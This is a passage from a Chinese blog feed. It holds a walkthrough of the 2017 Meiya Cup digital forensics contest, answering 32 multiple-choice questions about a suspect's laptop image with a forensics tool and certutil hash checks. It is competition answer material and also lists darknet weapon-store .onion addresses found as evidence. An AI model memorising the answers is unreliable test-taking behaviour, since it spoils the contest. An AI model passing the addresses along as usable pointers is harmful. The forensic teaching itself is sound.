class="line">&gt;&gt;&gt; print(hex(b))</span><br><span class="line">0xb1a1686d</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;image0&quot;&gt;image[0]&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;一张图片的百种姿势&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;1bpg&quot;&gt;1：bpg&lt;/span&gt;&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2017年第三届美亚杯电子取证-个人赛WP</title>
    <link href="http://mklkx.github.io/2021/04/15/2017%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/"/>
    <id>http://mklkx.github.io/2021/04/15/2017%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/</id>
    <published>2021-04-15T06:56:37.000Z</published>
    <updated>2021-05-04T11:39:45.699Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2017年第三届美亚杯电子取证-个人赛">2017年第三届美亚杯电子取证-个人赛</span></h3><hr><h4><span id="案件背景">案件背景</span></h4><blockquote><p>Gary是一位经常用手提电脑的人，而且热爱足球运动，常常看足球网站。他于2007年9月开始想赚快钱，思想变得偏激，并关注一些违法的事。于是Gary就想着赌博，查阅军事资料，了解恐怖袭击的新闻报道。另外他开始上网寻找有关如何购买枪械、刀等武器的资料，还寻找如何制造假网站，但最后均无收获。</p><p>检材：</p><p>.e01镜像</p><p>工具软件：</p><p>取证大师V6.1.67374RTM（FMP）</p></blockquote><h4><span id="1求镜像的md5哈希值">1：求镜像的MD5哈希值</span></h4><table><thead><tr><th>1</th><th>Gary的笔记本电脑已成功取证并制作成镜像 (Forensic Image)，下列哪个是其MD5哈希值。</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>0CFB3A0BB016165F1BDEB87EE9F710C9</strong></td></tr><tr><td>B.</td><td>5F1BDEB87EE9F710C90CFB3A0BB01616</td></tr><tr><td>C.</td><td>A0BB016160CFB3A0BB0161661670CFB3</td></tr><tr><td>D.</td><td>16160CFB3A0BB016166A0BB016166167</td></tr><tr><td>E.</td><td>FB3A0BB016165 B016166 A0DF7FJE2EJ0</td></tr></tbody></table><p>证据文件-》选中镜像-》摘要-》查看md5值</p><p><img lazyload src="/images/loading.svg" data-src="1-1.png" alt="1-1"></p><h4><span id="2求硬盘分区">2：求硬盘分区</span></h4><table><thead><tr><th>2</th><th>根据此镜像 (Forensic Image)，里面有多少个硬盘分区？</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td><strong>C.</strong></td><td><strong>3</strong></td></tr><tr><td>D.</td><td>4</td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="2-1.png" alt="2-1"></p><p>C盘D盘E盘</p><h4><span id="3开始逻辑区块地址lba">3：开始逻辑区块地址（LBA）</span></h4><table><thead><tr><th>3</th><th>你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）？</th></tr></thead><tbody><tr><td>A.</td><td>0</td></tr><tr><td>B.</td><td>512</td></tr><tr><td>C.</td><td>2,048</td></tr><tr><td><strong>D.</strong></td><td><strong>206,848</strong></td></tr><tr><td>E.</td><td>102,402,047</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="3-1.png" alt="3-1"></p><p>其中，C盘的设备描述为系统保留；D盘E盘为本地磁盘。</p><p><img lazyload src="/images/loading.svg" data-src="3-2.png" alt="3-2"></p><p>结合磁盘内容，找到D盘的物理位置105,906,176</p><p>因为”现今计算机上所谓一个逻辑区块通常是512或1024位组“</p><p>将105,906,176/512=206，848</p><p><strong><u>物理扇区，在winhex中就是$boot就是DBR</u></strong></p><h4><span id="4硬盘操作系统分区的大小">4：硬盘操作系统分区的大小</span></h4><table><thead><tr><th>4</th><th>你能找到硬盘操作系统分区的大小吗 (字节byte)？</th></tr></thead><tbody><tr><td>A.</td><td>48.7</td></tr><tr><td>B.</td><td>102,195,200</td></tr><tr><td>C.</td><td>140,232,703</td></tr><tr><td>D.</td><td>19,369,295,872</td></tr><tr><td><strong>E.</strong></td><td><strong>52,323,942,400</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="4-1.png" alt="4-1"></p><p>48.73*1024*1024*1024=52,323,439,083.52</p><h4><span id="5mft的物理起始偏移位置">5：$MFT的物理起始偏移位置</span></h4><table><thead><tr><th>5</th><th>在包含操作系统的分区内，$MFT的物理起始偏移位置是什么？</th></tr></thead><tbody><tr><td>A.</td><td>3328</td></tr><tr><td>B.</td><td>4,170,040</td></tr><tr><td>C.</td><td>6,026,176</td></tr><tr><td><strong>D.</strong></td><td><strong>6,498,304</strong></td></tr><tr><td>E.</td><td>16,949,352</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="5-1.png" alt="5-1"></p><p><strong><u>正常情况MFT以元文件的形式存储在相应磁盘分区的根目录中，但是是隐藏的。FMP可以直接访问到该文件。</u></strong></p><p><img lazyload src="/images/loading.svg" data-src="5-2.png" alt="5-2"></p><p>3,327,131,648/512=6,498,304</p><h4><span id="6操作系统的安装日期">6：操作系统的安装日期</span></h4><table><thead><tr><th>6</th><th>请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是？   （答案格式 －“世界协调时间＂：YYYY-MM-DD HH:MM UTC）</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-04 10:10 UTC</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-09-04 10:11 UTC</strong></td></tr><tr><td>C.</td><td>2017-09-04 10:12 UTC</td></tr><tr><td>D.</td><td>2017-09-04 10:13 UTC</td></tr><tr><td>E.</td><td>2017-09-14 02:14 UTC</td></tr></tbody></table><p>取证结果-》系统痕迹-》系统信息-》安装时间</p><p><img lazyload src="/images/loading.svg" data-src="6-1.png" alt="6-1"></p><p>2017-09-04 18:11:10</p><p>调整了时区后得到答案B</p><p>此处除了常识性的“-8”之外，遇到时区问题可以在此处验证调整</p><p><img lazyload src="/images/loading.svg" data-src="6-2.png" alt="6-2"></p><h4><span id="7sid">7：SID</span></h4><p><u><strong>SID为用户标识 （Security Identifiers）标识用户、组和计算机帐户的唯一的号码。</strong></u></p><table><thead><tr><th>7</th><th>用户“Gary＂的SID是什么？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>1000</strong></td></tr><tr><td>B.</td><td>1001</td></tr><tr><td>C.</td><td>1002</td></tr><tr><td>D.</td><td>1005</td></tr><tr><td>E.</td><td>1007</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="7-1.png" alt="7-1"></p><h4><span id="8做法同上">8：做法同上</span></h4><table><thead><tr><th>8</th><th>用户“彼得＂的SID是什么？</th></tr></thead><tbody><tr><td>A.</td><td>1000</td></tr><tr><td><strong>B.</strong></td><td><strong>1001</strong></td></tr><tr><td>C.</td><td>1002</td></tr><tr><td>D.</td><td>1005</td></tr><tr><td>E.</td><td>1007</td></tr></tbody></table><h4><span id="9操作系统">9：操作系统</span></h4><table><thead><tr><th>9</th><th>硬盘的操作系统是什么？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>Windows 7</strong></td></tr><tr><td>B.</td><td>Windows 8</td></tr><tr><td>C.</td><td>Windows 10</td></tr><tr><td>D.</td><td>Linux Red Hat 7.1</td></tr><tr><td>E.</td><td>MAC OS X</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="9-1.png" alt="9-1"></p><h4><span id="10查看默认浏览器">10：查看默认浏览器</span></h4><table><thead><tr><th>10</th><th>哪个是Windows的默认浏览器？</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>Microsoft Internet Explorer</strong></td></tr><tr><td>B.</td><td>Google Chrome</td></tr><tr><td>C.</td><td>Mozilla Firefox</td></tr><tr><td>D.</td><td>Opera</td></tr><tr><td>E.</td><td>QQ 浏览器</td></tr></tbody></table><p>取证后看到只有IE、Chrome和火狐，</p><p><img lazyload src="/images/loading.svg" data-src="10-1.png" alt="10-1"></p><p>根据常识可知IE为默认浏览器</p><h4><span id="11辨别url">11：辨别URL</span></h4><table><thead><tr><th>11</th><th>用户 “Gary＂曾经浏览过一些非法博彩网站，下列哪项URL符合？</th></tr></thead><tbody><tr><td>a.</td><td><a class="link" href="http://www.10086.com">www.10086.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>b.</strong></td><td><strong><a class="link" href="http://www.188bet.com">www.188bet.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td><strong>c.</strong></td><td><strong><a class="link" href="http://www.hv5858.com">www.hv5858.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>d.</td><td><a class="link" href="http://www.12377.cn">www.12377.cn<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>e.</strong></td><td><strong><a class="link" href="http://www.88.bettingwell.com">www.88.bettingwell.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>f.</td><td><a class="link" href="http://www.aaakk.org">www.aaakk.org<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td></td><td></td></tr><tr><td>A.</td><td>只有(a)  &amp; (b)</td></tr><tr><td>B.</td><td>(a), (b), (d) &amp; (f)</td></tr><tr><td>C.</td><td>(b), ©, (d) &amp; (f)</td></tr><tr><td>D.</td><td>(b),  ©, (e) &amp; (f)</td></tr><tr><td>E.</td><td>以上皆是</td></tr></tbody></table><p>通过实时搜索，</p><p>a:</p><p>无此记录</p><p>b:</p><p><img lazyload src="/images/loading.svg" data-src="11-1.png" alt="11-1"></p><p>根据标题判断为非法博彩网站</p><p>c:</p><p><img lazyload src="/images/loading.svg" data-src="11-2.png" alt="11-2"></p><p>d:</p><p><img lazyload src="/images/loading.svg" data-src="11-3.png" alt="11-3"></p><p>中国互联网举报中心</p><p>e:</p><p>在线博彩公司</p><p>f:</p><p>无此结果</p><p>PS：此处f项的结果笔者存在疑义，但结合选项选D</p><h4><span id="12登入名称">12：登入名称</span></h4><table><thead><tr><th>12</th><th>用户Gary曾经登入上述非法博彩网站，下列哪个是其登入名称？</th></tr></thead><tbody><tr><td>A.</td><td>ggchey68</td></tr><tr><td>B.</td><td>gany-cher88</td></tr><tr><td>C.</td><td>galy_chen88</td></tr><tr><td>D.</td><td>garychen1688</td></tr><tr><td><strong>E.</strong></td><td><strong>garychen88</strong></td></tr></tbody></table><p>结合第11题，发现上网记录的登陆信息里</p><p>访问www.188bet.com的[garychen88]</p><p><img lazyload src="/images/loading.svg" data-src="12-1.png" alt="12-1"></p><h4><span id="13邮箱">13：邮箱</span></h4><table><thead><tr><th>13</th><th>在所有用户中，用于电子邮件发送/接收的程序名称是什么？</th></tr></thead><tbody><tr><td>A.</td><td>新浪邮箱</td></tr><tr><td>B.</td><td>网易163</td></tr><tr><td>C.</td><td>阿里邮箱</td></tr><tr><td>D.</td><td>Foxmail</td></tr><tr><td><strong>E.</strong></td><td><strong>Mozilla Mail – ThunderBird</strong></td></tr></tbody></table><p>取证结果-》邮件解析</p><p><img lazyload src="/images/loading.svg" data-src="13-1.png" alt="13-1"></p><h4><span id="14usb使用痕迹">14：USB使用痕迹</span></h4><table><thead><tr><th>14</th><th>在该Windows系统中，曾经连接数个USB移动储存装置 (U盘)，下列那个不是  该系统连接过的USB移动储存装置 ?</th><th></th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>WD My Passport 0827  USB Device</strong></td><td></td></tr><tr><td>B.</td><td>StoreJet Transcend USB Device</td><td></td></tr><tr><td>C.</td><td>Samsung Portable  SSD USB Device</td><td></td></tr><tr><td>D.</td><td>StoreJet  TS256GESD400K USB Device</td><td></td></tr><tr><td>E.</td><td>General UDisk USB Device</td><td></td></tr></tbody></table><p>取证结果-》USB设备使用痕迹</p><p><img lazyload src="/images/loading.svg" data-src="14-1.png" alt="14-1"></p><h4><span id="15做法同上">15：做法同上</span></h4><table><thead><tr><th>15</th><th>在该Windows系统中，下列哪个USB移动储存装置 (U盘)曾被指派为‘Z’磁盘分区代号(Drive Letter) ?</th></tr></thead><tbody><tr><td>A.</td><td>WD My Passport 0827  USB Device</td></tr><tr><td>B.</td><td>StoreJet Transcend USB Device</td></tr><tr><td>C.</td><td>Samsung Portable  SSD USB Device</td></tr><tr><td>D.</td><td>StoreJet  TS256GESD400K USB Device</td></tr><tr><td><strong>E.</strong></td><td><strong>General UDisk USB Device</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="15-1.png" alt="15-1"></p><h4><span id="16最后关机时间">16：最后关机时间</span></h4><table><thead><tr><th>16</th><th>该Windows系统中，下列哪个是最后的关机时间?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>2017-10-31  4:52:54 UTC</strong></td></tr><tr><td>B.</td><td>2017-10-31  4:53:54 UTC</td></tr><tr><td>C.</td><td>2017-10-31  4:54:54 UTC</td></tr><tr><td>D.</td><td>2017-10-31  4:55:54 UTC</td></tr><tr><td>E.</td><td>2017-10-31  4:56:54 UTC</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="16-1.png" alt="16-1"></p><p>其中取证结果-》系统痕迹-》系统开关机时间</p><p>中也能看到关机时间，但与本题不符。为什么会出现这种情况呢？</p><p><img lazyload src="/images/loading.svg" data-src="16-2.png" alt="16-2"></p><p>本人认为，此处的逻辑顺序应为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2017-10-31 11:53:38（正常）开机</span><br><span class="line">2017-10-31 ？：？：？关闭电源（非正常关机）</span><br><span class="line">2017-10-31 12:52:54（正常）关机</span><br></pre></td></tr></table></figure><h4><span id="17电脑名称">17：电脑名称</span></h4><table><thead><tr><th>17</th><th>该Windows系统中，下列哪个是电脑名称?</th></tr></thead><tbody><tr><td>A.</td><td>GARYPC</td></tr><tr><td><strong>B.</strong></td><td><strong>GARY-PC</strong></td></tr><tr><td>C.</td><td>GARY_PC</td></tr><tr><td>D.</td><td>GARY</td></tr><tr><td>E.</td><td>GARY-NB</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="17-1.png" alt="17-1"></p><h4><span id="18邮箱账号">18：邮箱账号</span></h4><table><thead><tr><th>18</th><th>在该Windows系统中，下列哪个是用户Gary日常使用的邮箱帐号?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="mailto:ics_user@mail.com">ics_user@mail.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>B.</td><td><a class="link" href="mailto:ics_user@gmail.com">ics_user@gmail.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>C.</td><td><a class="link" href="mailto:gary@mail.com">gary@mail.com<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>D.</strong></td><td><strong><a class="link" href="mailto:gary_chen@mail.com">gary_chen@mail.com<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>E.</td><td><a class="link" href="mailto:gary_chen@gmail.com">gary_chen@gmail.com<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="18-1.png" alt="18-1"></p><h4><span id="19邮件记录">19：邮件记录</span></h4><table><thead><tr><th>19</th><th>在该Windows系统中，用户Gary曾经收过一封来自邮箱帐号 <a class="link" href="mailto:ics_user@mail.com">ics_user@mail.com<i class="fas fa-external-link-alt"></i></a> 的邮件，内容提及有关制作钓鱼网站及邮件帐号eric_wang99@outlook.com，下列哪个是此封邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td><strong>C.</strong></td><td><strong>2017-10-17  18:24:02</strong></td></tr><tr><td>D.</td><td>2017-10-26  19:17:08</td></tr><tr><td>E.</td><td>2017-10-26  19:24:57</td></tr></tbody></table><p>实时搜索【eric_wang99@outlook.com】</p><p>查看邮件记录</p><p><img lazyload src="/images/loading.svg" data-src="19-1.png" alt="19-1"></p><h4><span id="20同19题">20：同19题</span></h4><table><thead><tr><th>20</th><th>在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 eric_wang99@outlook.com的邮件，标题为“学习制作网站”，下列哪个是<u>第一封</u>邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td><strong>D.</strong></td><td><strong>2017-10-18  18:30:45</strong></td></tr><tr><td>E.</td><td>2017-10-18  19:38:05</td></tr></tbody></table><p>这里有一个逻辑拐点，【下列】之前是前情提要，之后是问题。</p><p>认真读题后意思是：</p><p><strong>第一封</strong>\<strong>来自</strong> eric_wang99@outlook.com的发送日期和时间是？</p><p><img lazyload src="/images/loading.svg" data-src="20-1.png" alt="20-1"></p><p>而摘要中的时间则表明</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2017-10-18 18:15 gary编辑</span><br><span class="line">2017-10-18 18:30:45 发送</span><br></pre></td></tr></table></figure><h4><span id="21同19题">21：同19题</span></h4><table><thead><tr><th>21</th><th>在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 <a class="link" href="mailto:eric_wang99@outlook.com">eric_wang99@outlook.com<i class="fas fa-external-link-alt"></i></a>邮件，标题为“学习制作网站”，下列哪个是第二封电邮的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td>D.</td><td>2017-10-18  18:30:45</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-18  19:38:05</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="21-1.png" alt="21-1"></p><h4><span id="22同19题">22：同19题</span></h4><table><thead><tr><th>22</th><th>用戶Gary亦曾經收過一封來自電郵帳號  <a class="link" href="mailto:ics_user@mail.com">ics_user@mail.com<i class="fas fa-external-link-alt"></i></a> 的電郵，附加了兩張與咖啡豆有關的相片，下列那個是此封電郵之發送日期及時間?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td><strong>D.</strong></td><td><strong>2017-10-26  19:17:08</strong></td></tr><tr><td>E.</td><td>2017-10-26  19:24:57</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="22-1.png" alt="22-1"></p><h4><span id="23导出附件查看md5">23：导出附件，查看MD5</span></h4><table><thead><tr><th>23</th><th>下列那項是與上述咖啡豆有關相片的MD5哈希值/哈希值(Hash value)?</th></tr></thead><tbody><tr><td>A.</td><td>449cebf0eb96499df047fe0bff8e1627</td></tr><tr><td><strong>B.</strong></td><td><strong>17f9c6bcca44d128f7ed6769a6920278</strong></td></tr><tr><td>C.</td><td>4bc48ce355acd4732f33a79e29728e96</td></tr><tr><td>D.</td><td>4bc48ce355acd4732f33a79e29728e97</td></tr><tr><td>E.</td><td>e3e545c80a7273b7b0d7c73dacdd7227</td></tr></tbody></table><p>找到题目中的两张图</p><p><img lazyload src="/images/loading.svg" data-src="23-2.png" alt="23-2"></p><p>右键导出</p><p><img lazyload src="/images/loading.svg" data-src="23-1.png" alt="23-1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514292669coffee-beans2.jpg MD5</span><br><span class="line">MD5 的 202141514292669coffee-beans2.jpg 哈希:</span><br><span class="line">3af01d89376adf829049967c52ad0799</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292676ROASTED-COFFEE-BEANS.jpg MD5</span><br><span class="line">MD5 的 202141514292676ROASTED-COFFEE-BEANS.jpg 哈希:</span><br><span class="line">17f9c6bcca44d128f7ed6769a6920278</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="24同23题">24：同23题</span></h4><table><thead><tr><th>24</th><th>在该Windows系统中，用户Gary还曾经收到一封来自邮箱帐号 <a class="link" href="mailto:eric_wang99@outlook.com">eric_wang99@outlook.com<i class="fas fa-external-link-alt"></i></a> 的邮件，附加有三张与Apple iCloud相关的相片，下列哪个为该封邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td>D.</td><td>2017-10-18  18:30:45</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-18  19:38:05</strong></td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="24-1.png" alt="24-1"></p><h4><span id="25连接wifi">25：连接WIFI</span></h4><table><thead><tr><th>25</th><th>Gary经常使用笔记本电脑浏览互联网，他的笔记本电脑上曾经连接过多少WIFI热点？</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td>C.</td><td>3</td></tr><tr><td><strong>D.</strong></td><td><strong>4</strong></td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="25-1.png" alt="25-1"></p><h4><span id="26全局唯一识别元globally-unique-identifier-guid">26：全局唯一识别元（Globally Unique Identifier, GUID）</span></h4><table><thead><tr><th>26</th><th>上述电脑曾经连接过星巴克WIFI热点，下列哪项是其全局唯一识别元（Globally Unique Identifier, GUID）？</th></tr></thead><tbody><tr><td>A.</td><td>{8039D237-A346-4BA1-9B78-5752580ED7F0}</td></tr><tr><td>B.</td><td>{39489FA0-DE35-4989-8730-E2E2ED15E85A}</td></tr><tr><td>C.</td><td>{558B94DF-8D68-4779-AA25-65FBDAB4C2B9}</td></tr><tr><td>D.</td><td>{4EFCDA7E-CE51-4EC2-8980-8629647C9968}</td></tr><tr><td><strong>E.</strong></td><td><strong>{AF0778E8-6C4F-41C6-84B2-CB14490CF29E}</strong></td></tr></tbody></table><p><u><strong>用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID 网络GUID、网卡GUID</strong></u></p><p><img lazyload src="/images/loading.svg" data-src="26-1.png" alt="26-1"></p><p><img lazyload src="/images/loading.svg" data-src="26-2.png" alt="26-2"></p><h4><span id="27ip地址">27：IP地址</span></h4><table><thead><tr><th>27</th><th>有关Gary的笔记本电脑，下列哪项是其最后分派得到的IP地址？</th></tr></thead><tbody><tr><td>A.</td><td>192.168.0.1</td></tr><tr><td>B.</td><td>192.168.10.4</td></tr><tr><td>C.</td><td>192.168.20.6</td></tr><tr><td><strong>D.</strong></td><td><strong>192.168.30.3</strong></td></tr><tr><td>E.</td><td>192.168.40.5</td></tr></tbody></table><p><img lazyload src="/images/loading.svg" data-src="27-1.png" alt="27-1"></p><h4><span id="28查看url">28：查看URL</span></h4><table><thead><tr><th>28</th><th>Eric曾发邮件给Gary，内容是关于如何在暗网(Dark Web)中浏览枪械的信息，以下哪个URL是由Eric提供的?</th></tr></thead><tbody><tr><td>A.</td><td><a class="link" href="http://hhnovpxmqrw5xaqg.onion">http://hhnovpxmqrw5xaqg.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td><strong>B.</strong></td><td><strong><a class="link" href="http://gunsjmzh2btr7lpy.onion">http://gunsjmzh2btr7lpy.onion<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>C.</td><td><a class="link" href="http://gunsdtk58tolcrre.onion">http://gunsdtk58tolcrre.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>D.</td><td><a class="link" href="http://armoryohajjhou6m.onion">http://armoryohajjhou6m.onion<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://armory45jijdf7d.onion">http://armory45jijdf7d.onion<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p>邮件记录没东西，查看附件</p><p>在【好东西.docx】里看到四个Deep web weapons Store Links</p><p>涉及</p><p><a class="link" href="http://hhnovpxmqrw4xaqg.onion/">http://hhnovpxmqrw4xaqg.onion/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="http://armoryohajjhou5m.onion/">http://armoryohajjhou5m.onion/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="http://gunsjmzh2btr7lpy.onion/">http://gunsjmzh2btr7lpy.onion/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="http://gunsdtk47tolcrre.onion/">http://gunsdtk47tolcrre.onion/<i class="fas fa-external-link-alt"></i></a></p><p>无法分辨</p><p>查看其他图片附件</p><p><img lazyload src="/images/loading.svg" data-src="28-1.png" alt="28-1"></p><h4><span id="29简单信息分析">29：简单信息分析</span></h4><table><thead><tr><th>29</th><th>Eric 售卖iCloud 网站给Gary 的价钱是多少?</th></tr></thead><tbody><tr><td>A.</td><td>$500</td></tr><tr><td>B.</td><td>$800</td></tr><tr><td><strong>C.</strong></td><td><strong>$1000</strong></td></tr><tr><td>D.</td><td>$1400</td></tr><tr><td>E.</td><td>$1500</td></tr></tbody></table><p>找到Eric发给Gary的文件，关键词出现在邮件主题“网站价钱”</p><p><img lazyload src="/images/loading.svg" data-src="29-1.png" alt="29-1"></p><h4><span id="30识别常用软件">30：识别常用软件</span></h4><table><thead><tr><th>30</th><th>Gary 经常将非法文件存储到该笔记本电脑的加密分区中，下列哪一个为该加密软件?</th></tr></thead><tbody><tr><td>A.</td><td>TrueCrypt</td></tr><tr><td><strong>B.</strong></td><td><strong>VeraCrypt</strong></td></tr><tr><td>C.</td><td>Bitlocker</td></tr><tr><td>D.</td><td>LUKS</td></tr><tr><td>E.</td><td>PGP WDE</td></tr></tbody></table><p>选项中提到的所有软件都为加密软件，</p><p>系统痕迹-》安装软件-》其他软件</p><p>发现B选项</p><p><img lazyload src="/images/loading.svg" data-src="30-1.png" alt="30-1"></p><h4><span id="31同23题">31：同23题</span></h4><table><thead><tr><th>31</th><th>在加密磁区内有三张与Apple iCloud有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>c9fbfaf3c45492c40feb83a83217f146</strong></td></tr><tr><td>B.</td><td>14903a7bd9d709b653f9afe8e3e51cdd</td></tr><tr><td>C.</td><td>7cb0f29812317db645edbcd6cf46e1ba</td></tr><tr><td>D.</td><td>5503d096bdf832460c8f51da62fbbb5d</td></tr><tr><td>E.</td><td>9918465b62171ba2c0a95595db629bf3</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514292583icloud1.png MD5</span><br><span class="line">MD5 的 202141514292583icloud1.png 哈希:</span><br><span class="line">d84ceb0d3f25996a8926c442a9021d89</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292595icloud2.png MD5</span><br><span class="line">MD5 的 202141514292595icloud2.png 哈希:</span><br><span class="line">c9fbfaf3c45492c40feb83a83217f146</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292598icloud3.png MD5</span><br><span class="line">MD5 的 202141514292598icloud3.png 哈希:</span><br><span class="line">a46bf504f78ae6688fcada85a40de826</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="32同23题">32：同23题</span></h4><table><thead><tr><th>32</th><th>在加密磁区内有三张与暗网(Dark Web)有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?</th></tr></thead><tbody><tr><td>A.</td><td>2836d35fb45c591211d5b6865c4a82f5</td></tr><tr><td>B.</td><td>d2b14799050b6c4ad6b07cd1227b91a5</td></tr><tr><td>C.</td><td>9110c96baa70c00acd8fbdfe2dc7c397</td></tr><tr><td>D.</td><td>703899985d881e2d103eb4fd1306be2e</td></tr><tr><td><strong>E.</strong></td><td><strong>4c57a45b8da5ea01e5eb7d875f94a7b8</strong></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514293877Screenshot 1.png MD5</span><br><span class="line">MD5 的 202141514293877Screenshot 1.png 哈希:</span><br><span class="line">144d3601d02e171f87b3291ff6076a17</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514293990Screenshot 2.png MD5</span><br><span class="line">MD5 的 202141514293990Screenshot 2.png 哈希:</span><br><span class="line">bb6d34c6573223794a6283f787268fc8</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 20214151429495Screenshot 3.png MD5</span><br><span class="line">MD5 的 20214151429495Screenshot 3.png 哈希:</span><br><span class="line">4c57a45b8da5ea01e5eb7d875f94a7b8</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span 